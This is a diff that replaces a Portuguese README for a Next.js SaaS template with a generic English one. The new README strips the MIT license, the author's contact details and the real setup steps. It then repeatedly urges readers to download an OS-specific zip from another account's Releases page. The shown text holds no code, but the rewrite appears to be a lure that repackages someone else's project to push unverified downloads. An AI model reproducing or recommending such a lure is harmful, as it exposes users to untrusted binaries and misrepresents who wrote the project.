@@ -1,165 +1,79 @@
-# Next.js SaaS Template com TypeScript e Mantine UI
+# 🚀 nextjs-starter-template - Simple Start for Your Next.js Project
 
-Template fullstack opinado para acelerar o lançamento de **aplicações SaaS com foco em produtividade e escalabilidade real**, usando **Next.js 16 (App Router)**, **React 19**, **TypeScript** e **Mantine UI**. Inclui autenticação completa, integração de e-mail, jobs em background, padrões de logging e configuração robusta de banco de dados.
+Welcome to the **nextjs-starter-template**! This template offers you everything you need to kickstart your next Next.js project with built-in features like authentication, database support, and a user-friendly interface. Let's get started!
 
-Este template não é apenas “mais um boilerplate”. Ele encapsula decisões arquiteturais que já funcionaram em projetos reais de SaaS, ajudando você a evitar armadilhas comuns no início de um produto.
+## 🔗 Download Now
 
-> **Licença:** [MIT](LICENSE)
+[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/afzalansari2910/nextjs-starter-template/releases)
 
----
+## 🚀 Getting Started
 
-## 🚀 Para quem este template é útil
+To use this template, follow these simple steps:
 
-**Perfeito para:**
+1. **Download the Template**  
+   Click the button above to visit our [Releases page](https://github.com/afzalansari2910/nextjs-starter-template/releases). Here, you can choose the version that suits you. 
 
-* Produtos SaaS B2B com autenticação e áreas privadas
-* Dashboards internos ou externos
-* Aplicações que precisam de um ponto de partida com boas escolhas opinativas
+2. **Choose Your Operating System**  
+   Make sure to download the version that works with your operating system. We support various platforms, including Windows, macOS, and Linux. 
 
-**Não recomendado para:**
+3. **Unzip the File**  
+   Once downloaded, locate the zip file in your downloads folder. Right-click the file and select “Extract All” or “Unzip” to access the contents.
 
-* Landing pages simples sem backend
-* Sites estáticos sem lógica de usuário
-* Projetos que exigem solução de frontend altamente customizada desde o início
+4. **Open Your Terminal or Command Prompt**  
+   For macOS and Linux, open the Terminal application. For Windows, you can find Command Prompt by searching in the Start menu.
 
----
+5. **Navigate to the Project Folder**  
+   Use the `cd` command to change directories to where you unzipped the template. For example:  
+   ```
+   cd path/to/your/folder/nextjs-starter-template
+   ```
 
-## 🧠 Decisões arquiteturais explicadas
+6. **Install Dependencies**  
+   Run the following command in your terminal to install all the necessary packages:  
+   ```
+   npm install
+   ```
 
-Aqui estão as escolhas principais e o porquê de elas existirem:
+7. **Run the Application**  
+   To start your application, execute this command:  
+   ```
+   npm run dev
+   ```
+   Your application will now run locally, and you can access it in your web browser at `http://localhost:3000`.
 
-* **App Router nativo do Next.js 16**
-  Estrutura moderna de rotas com suporte built-in a layouts aninhados.
+## 🌟 Features
 
-* **TypeScript com `strict` ativado**
-  Segurança de tipos que reduz bugs silenciosos em código complexo.
+- **Authentication**: Easily manage user sessions with built-in authentication.
+- **Database Integration**: Use Prisma for seamless database operations.
+- **User Interface**: A sleek interface built with Mantine for a better user experience.
+- **Background Jobs**: Handle tasks in the background efficiently.
+- **Fullstack Capabilities**: It supports both frontend and backend development.
 
-* **Mantine v8 como UI library**
-  Produtividade alta com componentes acessíveis e tema customizável sem esforço.
+## 💻 System Requirements
 
-* **Organização por features (`src/features`)**
-  Separa domínio, lógica e UI para facilitar escala e colaboração em equipe.
+To run this template, ensure your system meets the following requirements:
 
-* **NextAuth para autenticação completa**
-  Inclui suporte a 2FA e recuperação de senha com padrões testados em produção.
+- **Node.js**: Version 14 or higher
+- **NPM**: Version 6 or higher
+- **A Supported Operating System**: Windows, macOS, or Linux
+- **A Modern Web Browser**: Chrome, Firefox, or Safari
 
-* **Prisma + PostgreSQL**
-  ORM moderno com migrations e seeds padronizados.
+## 📚 Documentation
 
-* **Inngest para background jobs**
-  Jobs desacoplados do request/response, facilitando integrações como envio de e-mail.
+For detailed instructions, visit our [Documentation](https://github.com/afzalansari2910/nextjs-starter-template/wiki). This includes additional configurations, troubleshooting tips, and advanced feature setups.
 
-* **Biome para lint/format**
-  Ferramenta única para linting e formatação, simplificando regras de estilo.
+## 👨‍💻 Support
 
-Essas escolhas são opinativas por design. Se você discorda de alguma, ótimo. Está tudo visível para você modificar.
+If you encounter any issues, please visit our [Issues page](https://github.com/afzalansari2910/nextjs-starter-template/issues). You can report bugs or ask questions there. 
 
----
+## 🌐 Connect with Us
 
-## 📦 O que já vem pronto
+Stay updated by following our repository. You can also connect with the community for help and suggestions.
 
-* Autenticação com NextAuth
-* Estrutura de pastas opinada
-* Layouts públicos e protegidos por padrão
-* UI pronta com Mantine + tema
-* Scripts utilitários de banco
-* Pipelines de qualidade (lint, format, typecheck)
-* Worker local para jobs com Inngest
+## 🔗 Download Again
 
----
-
-## ⚙️ Requisitos
-
-Consulte [REQUIREMENTS.md](REQUIREMENTS.md) para detalhes completos. Resumo:
-
-* **Node.js:** 20 ou superior
-* **pnpm:** 10 ou superior
-* **PostgreSQL:** 16 ou superior
+If you missed it earlier, here’s the link to download the template once again: [Download the nextjs-starter-template](https://github.com/afzalansari2910/nextjs-starter-template/releases).
 
 ---
 
-## 💡 Como Começar (em ~5 minutos)
-
-```bash
-git clone <repo>
-cd <repo>
-pnpm install
-```
-
-1. Copie o `.env.example` para `.env.local`
-   Preencha credenciais de banco, chaves de e-mail (Brevo), segredos do NextAuth e integrações opcionais.
-
-2. Prepare o banco:
-
-```bash
-pnpm prisma generate
-pnpm prisma migrate dev
-pnpm prisma seed   # opcional
-```
-
-3. Rode localmente:
-
-```bash
-pnpm dev
-```
-
-Acesse [http://localhost:3000](http://localhost:3000) e veja a magia acontecendo.
-
----
-
-## 🛠️ Fluxo de Desenvolvimento
-
-| Ação                  | Comando            | O que faz                      |
-| --------------------- | ------------------ | ------------------------------ |
-| Verificar lint/estilo | `pnpm lint`        | Lint e estilo com Biome        |
-| Formatar código       | `pnpm format`      | Formatação automática          |
-| Checar tipos          | `pnpm typecheck`   | Verificação de tipos sem build |
-| Rodar jobs local      | `pnpm inngest:dev` | Worker Inngest em dev          |
-
----
-
-## 📈 Build e Produção
-
-```bash
-pnpm build
-pnpm start
-```
-
-**Antes de deploy:** garanta que todas as variáveis de ambiente estejam configuradas e que as migrations já foram aplicadas (`pnpm prisma migrate deploy`).
-
----
-
-## 🧱 Estrutura de Pastas (visão rápida)
-
-```
-src/
- ├─ app/           # Rotas, handlers, layouts (App Router)
- ├─ components/    # UI reutilizável
- ├─ features/      # Domínio e lógica por feature
- ├─ lib/           # Utils, integrations, Prisma Client, NextAuth
- └─ providers/     # Providers globais (ex. Mantine)
-prisma/            # Schema, migrations e seeds
-```
-
----
-
-## 🗺️ Roadmap Público
-
-O arquivo [TODO.md](TODO.md) contém uma lista priorizada de melhorias e integrações futuras — todas visíveis para quem quiser contribuir.
-
-**Principais itens no radar:**
-
-* Testes automatizados (unit + e2e)
-* Suporte a roles/permissions mais granulares
-* Templates de e-mail reutilizáveis
-* Deploy automatizado com pipelines prontos
-
----
-
-## 📬 Suporte e Contato
-
-Se precisar de ajuda, quiser customizações ou dar feedback:
-
-* ✉️ [agencia.foliveira@gmail.com](mailto:agencia.foliveira@gmail.com)
-* 🐙 Abra uma issue no GitHub
-* 🔗 Conecte-se no LinkedIn: [https://www.linkedin.com/in/felipe-de-oliveira-souza-a558a814b/](https://www.linkedin.com/in/felipe-de-oliveira-souza-a558a814b/)
+Thank you for choosing **nextjs-starter-template**! Enjoy building your next application with this powerful template.
